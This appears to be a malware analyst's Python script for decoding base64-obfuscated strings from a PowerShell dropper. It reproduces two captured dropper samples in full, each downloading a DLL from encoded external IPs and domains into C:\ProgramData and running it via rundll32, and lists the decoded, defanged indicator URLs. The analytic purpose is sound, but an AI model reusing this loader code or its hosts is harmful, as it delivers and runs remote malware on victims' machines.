"""
Author      : AnyGuy
Date        : 2023-06-14

Title       : decode-base64.py

Description : BASE64 / Malware Dropper
    
    - xy
    - xy
    - xy

"""

# Import Libraries
import base64
import re

# Defined encodings
encodings = ['utf-8', 'utf-16', 'latin-1', 'ascii', 'uft-16le']

encoded_text = 'aAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADUALgAxADEAMwAvAGoANABUAGoAagBvADQALwBVADYAMwBrADcAcgBnAFYAcQBrADQA'
# Encode Base64
data = base64.b64decode(encoded_text)

# FOR - LOOP to encode base64
for encoding in encodings:
    try:
        decoded_text = data.decode(encoding)
        print(f'Successfully decoded with {encoding}:')
        print("\n")
        print(decoded_text)
        break
    except UnicodeDecodeError:
        print(f'Failed to decode with {encoding}, trying next.')

# Add Spacings to the print
print("\n")

obfuscated_text = decoded_text
deobfuscated_text = re.sub(r'[.@ðàÀÆÚ¶]', '', obfuscated_text)

# Print deobfuscated_text
print(deobfuscated_text)


'''
# foreach ($psychopathiesAffiliable in $LesseningOthematomata -split "zZ") {try {$missing = "aAB0AHQAcABzADoALwAvADgAOQAuADEANQAyAC4AMQAxADkALgAxADkAMAA=ZaAB0AHQAcAA6AC8ALwA3ADIALgAxADIAMAAuADEAMgA1AC4AMgAzADMA"
LesseningOthematomata = "aAB0AHQAcABzADoALwAvADEAMgA5AC4AMQAxADAALgAyADIAMgAuADkAMgAvAEYALwBaAA==zZaAB0AHQAcAA6AC8ALwAxADYAMgAuADEANAAyAC4AMQAzADEALgA1ADIALwA1AGUAUQBkAGwALwBoADIAzZaAB0AHQAcAA6AC8ALwByAGgAYQBjAGgAaQAuAGkAbwAvAFQAUQAvAFIAaQBKADMAzZaAB0AHQAcAA6AC8ALwBVAG4AZQBzAGMAaABlAGEAdABlAGQALgBuAGcAbwAvAFYALwBEAE0AzZaAB0AHQAcABzADoALwAvAE4AbwBuAGMAZQByAHQAaQBmAGkAYwBhAHQAaQBvAG4ALgBtAGUAZABpAGEALwBHAHYAYQBqAEoALwB0AGwAcwByAA==zZaAB0AHQAcABzADoALwAvAEEAbABrAGEAbABpAG4AaQB6AGUAcwAuAHMAeQBzAHQAZQBtAHMALwBGAC8AdwA=zZaAB0AHQAcAA6AC8ALwAxADUAOAAuADIANQA1AC4AMgAxADMALgAyADAANQAvAHEAagBRAEkATgBhADMALwBZADkASgAyADcAYQA=zZaAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADIALgAxADgANQAvAE0AQQA0AGcAOQAvAGMAZwBHAFYAaABRAG8AdgA=zZaAB0AHQAcAA6AC8ALwAxADkAMgAuADEAMgAxAC4AMQA3AC4AMQA0ADkALwBRAG0AVgBlAHAALwBOAFcASABGAEUAYQBxAA=="
psychopathiesAffiliable = LesseningOthematomata.split("zZ")

for item in psychopathiesAffiliable:
    try:
        ransomableClangingly = base64.b64decode(item).decode('utf-16-le')
        print(ransomableClangingly)
    except Exception as e:
        print(f"An error occurred: {e}")
'''
        
############## FIRST // Base64 Decode ##############
'''

$Uprist = "aAB0AHQAcAA6AC8ALwAxADQANQAuADgANQAuADgAOAAuADUAOQA=Z=PaAB0AHQAcAA6AC8ALwAyADMANAAuADcANwAuADIAMAA2AC4AOQAyAA==Z=PaAB0AHQAcABzADoALwAvAHMAeQBuAG8AcAB0AGkAYwBhAGwAbAB5AEYAbwByAG4AaQBjAGUAcwAuAHMAdAB1AGQAaQBvAA=="
$epoptic = "aAB0AHQAcAA6AC8ALwBzAGMAYQBsAHAAcgB1AG0AQQB0AHQAbwByAG4AbQBlAG4AdAAuAGMAbwBtAHAAYQBuAHkAMbaAB0AHQAcAA6AC8ALwBVAG4AcgBvAHcAZQBsAGUAZAAuAGcAbABhAHMAcwA=MbaAB0AHQAcABzADoALwAvADEANAA0AC4AMgA0ADIALgA5ADEALgAxADAANgA=MbaAB0AHQAcABzADoALwAvAEcAbABvAGIAaQBuAGcAUwB1AG4AcwBjAG8AcgBjAGgALgBrAGkAdwBpAA=="
$fratch = "aAB0AHQAcAA6AC8ALwBEAGUAbQBpAGwAaQB0AGEAcgBpAHMAaQBuAGcALgBjAGwAYQBpAG0AcwA=psaAB0AHQAcABzADoALwAvAHUAbgBiAGEAYwBrAHcAYQByAGQALgBlAHgAcABlAHIAdAA=psaAB0AHQAcAA6AC8ALwAyADIAMgAuADEAMgA0AC4AOAA3AC4AMQAwADEA"
$LesseningOthematomata = "aAB0AHQAcABzADoALwAvADEAMgA5AC4AMQAxADAALgAyADIAMgAuADkAMgAvAEYALwBaAA==zZaAB0AHQAcAA6AC8ALwAxADYAMgAuADEANAAyAC4AMQAzADEALgA1ADIALwA1AGUAUQBkAGwALwBoADIAzZaAB0AHQAcAA6AC8ALwByAGgAYQBjAGgAaQAuAGkAbwAvAFQAUQAvAFIAaQBKADMAzZaAB0AHQAcAA6AC8ALwBVAG4AZQBzAGMAaABlAGEAdABlAGQALgBuAGcAbwAvAFYALwBEAE0AzZaAB0AHQAcABzADoALwAvAE4AbwBuAGMAZQByAHQAaQBmAGkAYwBhAHQAaQBvAG4ALgBtAGUAZABpAGEALwBHAHYAYQBqAEoALwB0AGwAcwByAA==zZaAB0AHQAcABzADoALwAvAEEAbABrAGEAbABpAG4AaQB6AGUAcwAuAHMAeQBzAHQAZQBtAHMALwBGAC8AdwA=zZaAB0AHQAcAA6AC8ALwAxADUAOAAuADIANQA1AC4AMgAxADMALgAyADAANQAvAHEAagBRAEkATgBhADMALwBZADkASgAyADcAYQA=zZaAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADIALgAxADgANQAvAE0AQQA0AGcAOQAvAGMAZwBHAFYAaABRAG8AdgA=zZaAB0AHQAcAA6AC8ALwAxADkAMgAuADEAMgAxAC4AMQA3AC4AMQA0ADkALwBRAG0AVgBlAHAALwBOAFcASABGAEUAYQBxAA=="
$astrakaniteSepterium = "aAB0AHQAcABzADoALwAvAG0AYQBjAGUAZABvAG4ARAByAGkAZgB0AHMALgBzAG8AeQA="

foreach ($psychopathiesAffiliable in $LesseningOthematomata -split "zZ"){
    try {
        $missing = "aAB0AHQAcABzADoALwAvADgAOQAuADEANQAyAC4AMQAxADkALgAxADkAMAA=ZaAB0AHQAcAA6AC8ALwA3ADIALgAxADIAMAAuADEAMgA1AC4AMgAzADMA"
        $Hoodies = "aAB0AHQAcABzADoALwAvADIAMQAxAC4AMQA3ADMALgA5ADQALgA3ADkAyGwaAB0AHQAcAA6AC8ALwA2ADAALgAxADIAMwAuADYAOQAuADEAMAA1AA=="
        $ransomableClangingly = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($psychopathiesAffiliable))
        
        Invoke-WebRequest $ransomableClangingly -O C:\\ProgramData\\Reglazes.dll
        $deglutinated = "aAB0AHQAcAA6AC8ALwBQAGUAbwB0AG8AbQB5AFIAZQBmAGkAbABsAGEAYgBsAGUALgBkAGUAcwBpAA==RveTaAB0AHQAcAA6AC8ALwBHAG8AZwBnAGwAaQBuAGcAQgBvAHIAYQBjAGUAcwAuAGQAYQBuAGMAZQA=RveTaAB0AHQAcAA6AC8ALwBTAGgAbwBuAGQAZQBOAG8AbgBtAG8AbQBlAG4AdABhAHIAeQAuAHcAaQBuAA==RveTaAB0AHQAcAA6AC8ALwB6AGUAbgBvAGMAZQBuAHQAcgBpAGMALgBtAGUAbQBvAHIAaQBhAGwA"
        
        if ((Get-Item -Path C:\\ProgramData\\Reglazes.dll).Length -ge 70196){
            powershell -encodedcommand "YwBtAGQAIAAvAGMAIAByAHUAbgBkAGwAbAAzADIAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABSAGUAZwBsAGEAegBlAHMALgBkAGwAbAAsAG0AdQBzAHQAOwA="
            $touristdomExanguin = "aAB0AHQAcAA6AC8ALwBQAGwAYQBzAGgAaQBuAGcAQwBhAHIAZABpAG8AdAByAG8AcABoAGkAYQAuAHYAZQBnAGEAcwA="
            $unstudious = "aAB0AHQAcABzADoALwAvAGcAYQB6AGUAbABsAGEALgBkAGUAbABpAHYAZQByAHkA"
            $declinator = "aAB0AHQAcABzADoALwAvADEANwA2AC4AMgA0ADUALgAxADcANQAuADEAMAAwAA==opwaAB0AHQAcAA6AC8ALwAyADIAOQAuADgANwAuADIANQAwAC4AMgA1ADQAopwaAB0AHQAcABzADoALwAvADEAMQA1AC4AMQA4ADAALgAxADYAMQAuADEAMwAxAA==opwaAB0AHQAcAA6AC8ALwA4ADIALgAyADQANQAuADQAMgAuADEANgA1AA=="
            break
        }
    } catch {
    
    }
}

'''

############## END OF FIRST // Base64 Decode ##############


# $Uprist = http[://]145.85.88.59
# $epoptic = http[://]scalprumAttornment.company https[://]GlobingSunscorch.kiwi https[://]GlobingSunscorchkiwi
# $fratch = http[:]//Demilitarising.claims http[://]Demilitarisingclaims
# $LesseningOthematomata = https[://]//129.110.222.92/F/Z
# $astrakaniteSepterium = https[://]macedonDrifts.soy https[://]macedonDriftssoy
# $psychopathiesAffiliable = hxxps[://]129[.]110[.]222[.]92/F/Z hxxp[://]162[.]142[.]131[.]52/5eQdl/h2 hxxp[://]rhachi[.]io/TQ/RiJ3 hxxp[://]Unescheated[.]ngo/V/DM hxxps[://]Noncertification[.]media/GvajJ/tlsr hxxps[://]Alkalinizes[.]systems/F/w hxxp[://]158[.]255[.]213[.]205/qjQINa3/Y9J27a hxxp[://]162[.]252[.]172[.]185/MA4g9/cgGVhQov hxxp[://]192[.]121[.]17[.]149/QmVep/NWHFEaq
# $missing = https[://]89.152.119.190
# $Hoodies = https[://]211.173.94.79
# $ransomableClangingly = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($psychopathiesAffiliable))
# Invoke-WebRequest $ransomableClangingly -O C:\\ProgramData\\Reglazes.dll
# $deglutinated = http[://]PeotomyRefillable.desi http[://]PeotomyRefillabledesi
# if ((Get-Item -Path C:\\ProgramData\\Reglazes.dll).Length -ge 70196){powershell cmd /c rundll32 C:\ProgramData\Reglazes.dll,must
# $touristdomExanguin = http[://]PlashingCardiotrophia.vegas http[://]PlashingCardiotrophiavegas
# $unstudious = https[://]gazella.delivery https[://]gazelladelivery
# $declinator = https[://]176.245.175.100


### 2nd Finding in the Wild ###
'''

$yahwism = "aAB0AHQAcABzADoALwAvADIAMgA4AC4AMQA2ADQALgAyADAANAAuADEAMAA1AC8AVwBPAC8AMAA=KuzxaAB0AHQAcAA6AC8ALwA0ADYALgA5ADkALgAxADkANAAuADEAMgAxAC8ARQBTAC8ASwBlAFcATQBBAA==KuzxaAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADIALgAyADUAMwAvAGQATAByAGwAWAAxAGIALwBRAGQASQBEADIAKuzxaAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADUALgAyADMANgAvAFEAcABQAHEALwBzAFEAawBSAGEANwBzAEMARwBpAA==KuzxaAB0AHQAcAA6AC8ALwAxADYAMgAuADIANQAyAC4AMQA3ADUALgAxADEAMwAvAGoANABUAGoAagBvADQALwBVADYAMwBrADcAcgBnAFYAcQBrADQA"
$yahwism = hxxps[://]228[.]164[.]204[.]105/WO/0
$yahwism = hxxps[://]228[.]164[.]204[.]105/WO/0
$yahwism = hxxp[://]46[.]99[.]194[.]121/ES/KeWMA
$yahwism = hxxp[://]162[.]252[.]175[.]236/QpPq/sQkRa7sCGi
foreach ($CardelPseudochemical in $yahwism -split "Kuzx") {
    try {
        $uncredentialed = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($CardelPseudochemical))
        
        Invoke-WebRequest $uncredentialed -O C:\\ProgramData\\Tartrazin.dll

        $MythiciseReferendaries = "aAB0AHQAcABzADoALwAvADEAMgA1AC4AMgAyADEALgAyADMANwAuADIANAA0AA==qaAB0AHQAcAA6AC8ALwAyADEAMQAuADEANAAwAC4AMQAwADkALgAxADUAMAA=qaAB0AHQAcABzADoALwAvAFMAeQBsAGkAcwB0AGkAYwBhAGwAbAB5AC4AbABlAGcAYQBsAA==qaAB0AHQAcAA6AC8ALwBMAGkAbgBrAGEAYgBsAGUALgBkAGkAcgBlAGMAdABvAHIAeQA="
        $CtenoidianDrawboy = "aAB0AHQAcABzADoALwAvAE0AbwBuAGEAYwBvAFAAaABlAG4AbwBsAHMAdQBsAHAAaABvAG4AZQBwAGgAdABoAGEAbABlAGkAbgAuAGcAdQByAHUAoxSCaAB0AHQAcABzADoALwAvAEoAaQBsAHQAaQBuAGcALgBsAGkAdgBlAA==oxSCaAB0AHQAcABzADoALwAvAEMAcgB5AHAAdABvAHAAcgBvAHMAZQBsAHkAdABlAC4AZQBtAGEAaQBsAA==oxSCaAB0AHQAcAA6AC8ALwBzAHAAaQBkAGUAcgBpAGUAcgAuAGQAbwB3AG4AbABvAGEAZAA="
        $antidoraDoughhead = "aAB0AHQAcAA6AC8ALwA5ADYALgAxADUAMwAuADIANAAyAC4ANQA5AA==vNflaAB0AHQAcAA6AC8ALwA5ADAALgAyADAAMgAuADEAOAA5AC4AMgAwADkA"
        
        if ((Get-Item -Path C:\\ProgramData\\Tartrazin.dll).Length -ge 86321){
            powershell -encodedcommand "YwBtAGQAIAAvAGMAIAByAHUAbgBkAGwAbAAzADIAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABUAGEAcgB0AHIAYQB6AGkAbgAuAGQAbABsACwAbQB1AHMAdAA7AA=="
            $subdepositories = "aAB0AHQAcAA6AC8ALwA5ADYALgAxADEAMAAuADEAMAAyAC4AMgAzADQADVtaAB0AHQAcABzADoALwAvADIAMQAwAC4AMQAxADMALgA5ADMALgA2ADQA"
            $nausity = "aAB0AHQAcABzADoALwAvAEIAdQBjAGsAYgBvAGEAcgBkAEQAagBhAGwAbQBhAGkAdABlAC4AZgBpAA==aaAB0AHQAcAA6AC8ALwAxADYAMQAuADIAMwAyAC4AMQA0ADgALgA4ADIAaaAB0AHQAcABzADoALwAvAEQAaQBmAGYAaQBjAHUAbAB0AGwAeQBDAGEAcgByAG8AdABpAG4AZwAuAGQAZQBzAGkAaaAB0AHQAcABzADoALwAvADcANQAuADEAMAA2AC4AOAA0AC4AMQA1ADIA"
            $ElegitPretelegraphic = "aAB0AHQAcABzADoALwAvADkAMAAuADEANwA2AC4AMQAzADYALgA1ADQAaJbaAB0AHQAcABzADoALwAvAGUAbgBtAGEAbgBjAGgAZQBDAG8AbQBzAGEAdAAuAHMAawA="
            break
        }
    } catch {
    
    }
}

'''



